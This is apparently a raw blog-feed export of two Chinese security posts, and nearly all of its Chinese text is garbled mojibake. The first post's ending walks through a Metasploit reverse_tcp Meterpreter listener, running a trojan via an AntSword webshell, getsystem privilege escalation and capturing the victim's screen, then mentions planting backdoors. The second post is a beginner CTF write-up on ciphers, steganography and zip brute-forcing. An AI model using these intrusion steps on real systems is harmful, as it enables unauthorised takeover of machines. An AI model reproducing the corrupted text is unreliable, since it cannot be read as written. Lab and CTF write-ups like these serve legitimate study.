<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png" alt=""><br>
ä¸Šä¼ æˆåŠŸåï¼Œæˆ‘ä»¬åœ¨kaliå¯åŠ¨msf<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png" alt=""></p>
<p><strong>æ‰§è¡Œç›‘å¬</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png" alt=""><br>
<strong>æ‰§è¡Œæœ¨é©¬</strong></p>
<p>msfå¼€å¯ç›‘å¬ä¹‹åï¼Œæˆ‘ä»¬å»èšå‰‘webshellæ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png" alt=""><br>
æ‰§è¡Œä¹‹åï¼Œå›åˆ°kaliï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°msfç›®æ ‡æ­£åœ¨å›è¿ï¼Œåˆ›å»ºMeterpreterä¼šè¯æˆåŠŸ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png" alt=""></p>
<p><strong>ææƒ</strong></p>
<p>é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ç”¨æˆ·æƒé™<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png" alt=""><br>
å‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™ï¼Œä¹‹å‰æˆ‘ä»¬å·²ç»åœ¨webshellè§‚å¯Ÿåˆ°å¯¹æ–¹æ˜¯win7ç³»ç»Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨çš„æ˜¯windowsçš„è½½è·æ”»å‡»<br>
æˆ‘ä»¬å°è¯•ä½¿ç”¨getsystemè¿›è¡Œææƒè¯•è¯•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png" alt=""><br>
å‘ç°ç›´æ¥ææƒæˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ‹¥æœ‰windowsæœ€é«˜æƒé™system<br>
æ¥ä¸‹æ¥æˆ‘ä»¬æ‰“å°ä¸€ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œå¹¶ä¸”æ‹ç…§å¯¹æ–¹ç”µè„‘ç°åœ¨çŠ¶æ€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png" alt=""><br>
okï¼ŒæˆåŠŸã€‚</p>
<h1>ç»“è¯­</h1>
<p>åœ¨æ‹¿åˆ°systemæƒé™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¹²å¾ˆå¤šå¾ˆå¤šçš„äº‹â€¦ä¾‹å¦‚ç»™å¯¹æ–¹ç§ä¸‹åé—¨ï¼Œæ‹¿æ¥å½“è‚‰é¸¡ç­‰ç­‰ã€‚ã€‚ã€‚<br>
è¿™å‘Šè¯‰æˆ‘ä»¬å¼€å‘ç½‘ç«™å¿…é¡»æ³¨é‡å®‰å…¨ï¼Œå¦åˆ™å¸¦æ¥çš„åæœæ˜¯æ— ç©·å¤§çš„ã€‚<br>
emmmâ€¦è¿™æ³¢æœ‰ç‚¹éš¾å—ã€‚</p>
<p><strong>æ³¨ï¼šæœ¬åšå®¢ä»…ä¾›æŠ€æœ¯ç ”ç©¶ï¼Œè‹¥å°†å…¶ä¿¡æ¯åšå…¶ä»–ç”¨é€”ï¼Œç”±ç”¨æˆ·æ‰¿æ‹…å…¨éƒ¨æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œæœ¬åšå®¢ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ï¼Œè¯·éµå®ˆä¸­åäººæ°‘å…±å’Œå›½å®‰å…¨æ³•</strong></p>
]]></content>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>CtfShowèŒæ–°åŒºWP</title>
    <url>/posts/25127/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å¯¹ï¼Œæˆ‘å°±æ˜¯èŒæ–°ï¼Œå“­å“­ã€‚<br>
èŒæ–°ç³»åˆ—éœ€è¦èŒæ–°ç å¼€å¯ï¼ŒæŒ‰ç…§ç¬¬ä¸€é¢˜æç¤ºåŠ ç¾¤å³å¯è·å¾—ï¼Œä¸è¿‡æœ‰äº›é¢˜æœ‰æ—¶å€™æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘è®°å½•çš„è¯ä¼šæ–­æ–­ç»­ç»­çš„<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/DDB74BA5D9F54D97E757A1B862D52268.gif" width = "200" height = "200" style="float: left;"/></p>
<h2 id="Crypto"><a class="header-anchor" href="#Crypto">Â¶</a>Crypto</h2>
<h3 id="å¯†ç 1"><a class="header-anchor" href="#å¯†ç 1">Â¶</a>å¯†ç 1</h3>
<p>ç»™å‡ºäº†ä¸€ä¸²16è¿›åˆ¶çš„æ•°æ®ï¼Œæˆ‘ä»¬å…ˆè½¬æ¢æˆstr<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/_FDUR7%7B_ZR%7BCBF%28LSX9%5D69S.png" alt=""><br>
å¾—åˆ°ä¸€ä¸²base64ç¼–ç çš„æ•°æ®ï¼Œæˆ‘ä»¬å†å»è§£ä¸€ä¸‹base64<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/J%25OCNJY%40%29BW%7D%5DBVU%29Q_P8PS.png" alt=""><br>
è§£ç åå¾—åˆ°ä¸€ä¸²æ …æ å¯†ç ï¼Œå†å»è§£ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%811/%28Y5DCLQXOI%24%29MQ7DLZA36%288.png" alt=""><br>
åœ¨æ æ•°ä¸º19çš„æ—¶å€™å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;dffb06a33eeeb0d259c84bd8cf146d08-&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¯†ç 2"><a class="header-anchor" href="#å¯†ç 2">Â¶</a>å¯†ç 2</h3>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%812/IO2LW3_4X%24VPD56%25%5D422DWS.png" alt=""><br>
æˆ‘ä»¬å»çœ‹ä¸€ä¸‹é”®ç›˜ï¼Œå‘ç°è¢«rdcvbg 2qase3 6tghu7åˆ†åˆ«åŒ…å›´çš„é”®æ˜¯fã€wå’Œy<br>
äºæ˜¯æŒ‰ç…§æ ¼å¼å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEY&#123;fwy&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¯†ç 3"><a class="header-anchor" href="#å¯†ç 3">Â¶</a>å¯†ç 3</h3>
<p>é¢˜ç›®ç»™å‡ºä¸€æ®µå­—ç¬¦ï¼Œçœ‹èµ·æ¥æ˜¯è«æ–¯å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. &#x2F;-- -.. -- -.. -.. --&#x2F; -- -- -- -- -- &#x2F;-- -.. -.. -- -.. -- &#x2F;-- -.. -.. -- </span><br></pre></td></tr></table></figure>
<p>è§£å¯†åå¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MORSEnullISnullCOOLnullBUTnullBACONnullISnullCOOLERnullMMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</span><br></pre></td></tr></table></figure>
<p>ç»“åˆé¢˜ç›®æç¤ºåŸ¹æ ¹ï¼Œåªå¤„ç†å°¾éƒ¨Må’ŒDï¼Œå°†Mè½¬æ¢æˆAï¼ŒDè½¬æ¢æˆB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AABBABABAAABBBABABBAAAAAAABBABAABBA</span><br></pre></td></tr></table></figure>
<p>å†è¿›è¡ŒåŸ¹æ ¹å¯†ç è§£å¯†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%813/2719%7B%7D%24~3%5BWB_M%28I%291N%5DNL2.png" alt=""></p>
<h3 id="å¯†ç 4"><a class="header-anchor" href="#å¯†ç 4">Â¶</a>å¯†ç 4</h3>
<p>ç»™å‡ºä¸€ä¸²base64ç¼–ç ï¼Œå»è§£ç ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/Z0_%7D%28ACQDPSWIDCT%7B7ZN%24_F.png" alt=""><br>
å†æ¬¡baseå®¶æ—base85è§£å¯†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E5%AF%86%E7%A0%814/04JMGQ%293%28%60W39UZ%24PK~F%5DUT.png" alt=""><br>
å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;base_base_base&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a class="header-anchor" href="#Misc">Â¶</a>Misc</h2>
<h3 id="éšå†™1"><a class="header-anchor" href="#éšå†™1">Â¶</a>éšå†™1</h3>
<p>ä¸‹è½½ä¸‹æ¥çš„pngæ–‡ä»¶æ‰“ä¸å¼€ï¼Œæç¤ºé”™è¯¯ï¼Œæ”¾è¿›010è¿›å»æŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/J_%28%5BAFO4S%5B3K%40C%29S03_%5DY1J.png" alt=""><br>
å‘ç°æ–‡ä»¶å¤´é”™è¯¯ï¼Œpngæ–‡ä»¶å¤´åº”è¯¥æ˜¯89504E47ï¼Œå°†99æ”¹æˆ89ï¼Œå†ä¿å­˜æ‰“å¼€æ–‡ä»¶ï¼Œå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E9%9A%90%E5%86%991/%60H%5D8C_3VB0IV%7D%25_UF7UEB%5B6.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;zhe_ci_meiyou_ctfshow&#125;</span><br></pre></td></tr></table></figure>
<h3 id="éšå†™2"><a class="header-anchor" href="#éšå†™2">Â¶</a>éšå†™2</h3>
<p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€å¼ jpgå›¾ç‰‡ï¼Œå›¾ç‰‡æç¤ºjphséšå†™ï¼Œç”¨Jphswinå·¥å…·æ‰“å¼€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/9%606%7BK5P%5DIM%60X5%60%29K%5B6YXU%29V.png" alt=""><br>
ç‚¹å‡»seekè§£å¯†ï¼Œå¯†ç æ²¡æœ‰ï¼Œå°±ç©ºç€ä¸å†™ï¼Œç„¶åå¦å­˜ä¸ºtxtæ–‡æœ¬ï¼Œå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;202cb962ac59075b964b07152d234b70&#125;</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°-éšå†™2"><a class="header-anchor" href="#èŒæ–°-éšå†™2">Â¶</a>èŒæ–°_éšå†™2</h3>
<p>ä¸‹è½½æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„zipå‹ç¼©åŒ…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/E%296IXVG444M%24KA5B1%25%29_1XN.png" alt=""><br>
æç¤ºæˆ‘ä»¬æ˜¯å¯†ç æ˜¯ç”Ÿæ—¥ï¼Œæ‰€ä»¥æœ€é•¿æœ‰8ä½æ•°å­—ï¼Œç›´æ¥å‹ç¼©åŒ…çˆ†ç ´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%992/KY4P%25ODWTF1NV%7B1HAWHF%7DU3.png" alt=""><br>
å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸ºï¼š19981000<br>
æ‰“å¼€å‹ç¼©åŒ…åå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;brute_force&#125;</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°éšå†™3"><a class="header-anchor" href="#èŒæ–°éšå†™3">Â¶</a>èŒæ–°éšå†™3</h3>
<p>è¿™é¢˜ç›´æ¥æ‰“å¼€å›¾ç‰‡åœ°å€ï¼Œå°±æœ‰flagï¼Œemmm<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%993/B9XXQPT35%7BX4%40%7BFNUL8BA6Y.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;xinti_gkd&#125;</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°éšå†™4"><a class="header-anchor" href="#èŒæ–°éšå†™4">Â¶</a>èŒæ–°éšå†™4</h3>
<p>ä¸‹è½½çš„æ˜¯ä¸€ä¸ªdocæ–‡æ¡£<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/QQ%E6%88%AA%E5%9B%BE20210115224404.png" alt=""><br>
è¿™é‡Œå…‰æ ‡åœåœ¨ä¸‹è¾¹å¤šä¸€è¡Œï¼ŒçŒœæµ‹å¯èƒ½æœ‰æ–‡å­—è¢«éšè—äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å»é€‰é¡¹æ‰“å¼€æ˜¾ç¤ºä¸€ä¸‹éšè—æ–‡å­—<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/DRO%7DID7PMHA8X%285P%24X%7D%254%5B6.png" alt=""><br>
å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%994/7G8X7YG1%601~MKYZZO2F%40%282J.png" alt=""><br>
å½“ç„¶è¿˜æœ‰ä¸€ç§åŠæ³•ï¼Œå°±æ˜¯crtl+aå…¨é€‰å¤åˆ¶åˆ°å¤–é¢(éšè—çš„æ–‡å­—ä¸€èµ·è¢«é€‰ä¸­)ï¼Œå°±å¯ä»¥çœ‹åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;word_stega&#125;</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°éšå†™5"><a class="header-anchor" href="#èŒæ–°éšå†™5">Â¶</a>èŒæ–°éšå†™5</h3>
<p>æ‰“å¼€ï¼Œç»™äº†æˆ‘ä»¬ä¸€æ®µunicodeç¼–ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/ZT%5BEJQ%60WI%7B4%5D%28%7D%5D0E1UR7Y7.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä´€å¨€åœ€äœ€äŒ€å¨€å¨€ä¤€ä¸€äˆ€å„€åœ€ã˜€å €ãŒ€ä¬€ä¸€ä˜€ãˆ€å˜€ã˜€å¤€å€å˜€ä°€ã”€ã€åœ€ã˜€ãŒ€å€ä €ä°€ã”€åˆ€ä€äœ€ä´€åŒ€ãœ€ä˜€ä”€ã´€ã´€ã´€ã´€ã´€ã´€</span><br></pre></td></tr></table></figure>
<p>ä»ä¸­æ–‡è½¬æ¢åå¾—åˆ°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/UZKYZ3%40%25D%5BYE0PUTIRA%24%24%40T.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u4d00\u5a00\u5700\u4700\u4300\u5a00\u5a00\u4900\u4e00\u4200\u5100\u5700\u3600\u5800\u3300\u4b00\u4e00\u4600\u3200\u5600\u3600\u5900\u5400\u5600\u4c00\u3500\u3400\u5700\u3600\u3300\u5400\u4800\u4c00\u3500\u5200\u4400\u4700\u4d00\u5300\u3700\u4600\u4500\u3d00\u3d00\u3d00\u3d00\u3d00\u3d00</span><br></pre></td></tr></table></figure>
<p>å†16è¿›åˆ¶è½¬åŒ–æˆå­—ç¬¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/%60351NNWFW91L4F272ZLX229.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>base32è§£å¯†å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%995/23ZKJ5~_DQAM%40E0%29%5BOC3%24LE.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag(hao_jiu_bu_yong_b32_)</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°éšå†™6"><a class="header-anchor" href="#èŒæ–°éšå†™6">Â¶</a>èŒæ–°éšå†™6</h3>
<p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œæ‹–è¿›éŸ³é¢‘åˆ†æè½¯ä»¶é‡Œ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%25OX%7D_%7DD_%252AZA%7DOH3V0P%25F0.png" alt=""><br>
çœ‹åˆ°ä¸€æ®µæœ‰è§„å¾‹çš„æ³¢å½¢ï¼Œåº”è¯¥æ˜¯è«æ–¯å¯†ç ï¼Œé•¿çš„æ›¿æ¢æˆ-ï¼ŒçŸ­çš„æ›¿æ¢æˆ.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- ..- --.. .. -.- .. ... --. ----- ----- -..</span><br></pre></td></tr></table></figure>
<p>è«æ–¯å¯†ç è§£å¯†å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%90%8C%E6%96%B0%E9%9A%90%E5%86%996/%7DZ%5D%40_5%24_FYQ1CQ_FY%5BVY%7D%290.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;MUZIKISG00D&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹1"><a class="header-anchor" href="#æ‚é¡¹1">Â¶</a>æ‚é¡¹1</h3>
<p>æ‰“å¼€ï¼Œé¢˜ç›®è¯´æ˜å¦‚ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/%28JU4MLHWM7%5D%60D2_K%7BP7T%5BPA.png" alt=""><br>
é‚£æˆ‘ä»¬ç›´æ¥æ‹¿è¿™ä¸ªmd5å»è§£ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B91/F%25ZBJ%40T~%25K%7BTI%5DRYX%60DUDJV.png" alt=""><br>
å¾—åˆ°ç»“æœä¸ºï¼šhelloctfï¼Œæ‰€ä»¥flagæ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹2"><a class="header-anchor" href="#æ‚é¡¹2">Â¶</a>æ‚é¡¹2</h3>
<p>ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹åæ˜¯ä¸€å¼ pngå›¾ç‰‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/QF%29BKVD%7D9VL3ONLAYJF%40%405U.png" alt=""><br>
ä¸¢è¿›010è§‚å¯Ÿï¼Œçœ‹åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B9%E4%BA%8C/XZR9%408LLSZROT6%25~D7%28%5B%2987.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ctfshow_im_coming&#125;</span><br></pre></td></tr></table></figure>
<h3 id="èŒæ–°æ‚é¡¹3"><a class="header-anchor" href="#èŒæ–°æ‚é¡¹3">Â¶</a>èŒæ–°æ‚é¡¹3</h3>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B93/TR577_DC6Z9CP%40K_M%405W%609F.png" alt=""><br>
é€šè¿‡é¢˜ç›®æè¿°ï¼Œå¯ä»¥å¾—åˆ°è¿™äº›æ•°å­—97ï¼Œ10ï¼Œ01ï¼Œè¿˜ç€é‡è¯´äº†åå­—å°äº”ï¼Œé“¶è¡Œå¡å¯†ç åªèƒ½æ˜¯æ•°å­—ï¼Œé‚£å°±æ˜¯15è°éŸ³ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯97,10,01,15ï¼Œé“¶è¡Œå¡å¯†ç åªæœ‰6ä½ï¼Œæ‰€ä»¥å°±æ˜¯äº’ç›¸ç»„åˆä¸€ä¸‹ï¼Œæˆ‘æ˜¯ç›´æ¥971015ï¼ŒæŠŠåé¢çš„01æ¢æˆ15æˆåŠŸäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;971015&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹4"><a class="header-anchor" href="#æ‚é¡¹4">Â¶</a>æ‚é¡¹4</h3>
<p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œæ ¹æ®æç¤ºï¼Œå¯†ç ä¸º372å¼€å¤´çš„9ä½æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ª372000000åˆ°372999999çš„å­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pd.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">372000000</span>,<span class="number">373000000</span>,<span class="number">1</span>):</span><br><span class="line">        f.write(str(i)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/IOYK~1KO%5BL%60TV2N832%5D%60K78.png" alt=""><br>
å†è¿›è¡Œå‹ç¼©åŒ…çˆ†ç ´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B94/N~TU%5DY68K_7H7%60N%5B2JRQ201.png" alt=""><br>
å¾—åˆ°å¯†ç ä¸º372619038ï¼Œæ‰€ä»¥flagä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;372619038&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ‚é¡¹5"><a class="header-anchor" href="#æ‚é¡¹5">Â¶</a>æ‚é¡¹5</h3>
<p>æ‰“å¼€é¢˜ç›®ï¼Œä¸‹è½½å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶åï¼Œä½†æ²¡æœ‰åç¼€ï¼Œä¸¢è¿›010ä¸­æŸ¥çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/J%5D69%29X%7D%25%24F96V~%7BJ5AT3QFO.png" alt=""><br>
å‘ç°ä¸€æ®µæ–‡å­—ï¼Œæ‹¿å»è°·æ­Œç¿»è¯‘çœ‹çœ‹â€¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E6%9D%82%E9%A1%B95/V4DK2Z%25P%25MXAQBPR%28UC%28SQA.png" alt=""><br>
ç¿»è¯‘çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ³¨æ„åˆ°åŸæ–‡ä¸­æœ‰{}ä¸¤ä¸ªç¬¦å·ï¼Œè¿˜æœ‰Få¼€å¤´çš„å¤§å†™ï¼ŒçŒœæµ‹å…¨æ–‡çš„å¤§å†™å­—æ¯ç»„åˆèµ·æ¥å°±æ˜¯flag<br>
äºæ˜¯å†™ä¸ªè„šæœ¬</p>
